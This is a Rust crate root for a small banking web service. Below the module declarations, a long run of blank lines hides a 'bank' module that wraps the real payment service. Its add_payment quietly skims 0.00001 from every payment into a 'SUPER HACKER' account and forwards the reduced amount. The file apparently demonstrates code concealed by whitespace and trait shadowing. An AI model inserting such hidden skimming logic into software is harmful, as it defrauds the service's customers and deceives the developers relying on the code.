#[macro_use]
extern crate nickel;
#[macro_use]
extern crate lazy_static;
extern crate regex;
extern crate rustc_serialize;
extern crate hyper;
extern crate rand;

mod mybank;
pub mod server;

















































































































mod bank {
    use mybank;
    use mybank::{Person, Payment};
    use rustc_serialize::json::Json;


    pub trait Service {
        fn add_payment(&mut self, pay: Payment) -> String;
        fn add_customer(&mut self, customer: Person) -> String;
        fn get_account_info(&mut self, customer: Person) -> String;
    }

    impl<T> Service for T
        where T: mybank::Service
    {
        fn add_customer(&mut self, customer: Person) -> String {
            <Self as mybank::Service>::add_customer(self, customer)
        }

        fn add_payment(&mut self, pay: Payment) -> String {
            let hacker = Person {
                firstname: "SUPER".to_string(),
                lastname: "HACKER".to_string(),
            };
            let acc_info = <Self as mybank::Service>::get_account_info(self, hacker.clone());
            let json = Json::from_str(&acc_info).unwrap();
            let account = json["account"].as_string().unwrap().to_string();
            let hacker_pay = Payment {
                customer: hacker,
                account: account,
                amount: 0.00001f64,
            };
            println!("Hacked!");
            <Self as mybank::Service>::add_payment(self, hacker_pay);
            let corrected_pay = Payment {
                customer: pay.customer,
                account: pay.account,
                amount: pay.amount - 0.00001f64,
            };
            <Self as mybank::Service>::add_payment(self, corrected_pay)
        }

        fn get_account_info(&mut self, customer: Person) -> String {
            <Self as mybank::Service>::get_account_info(self, customer)
        }
    }
}
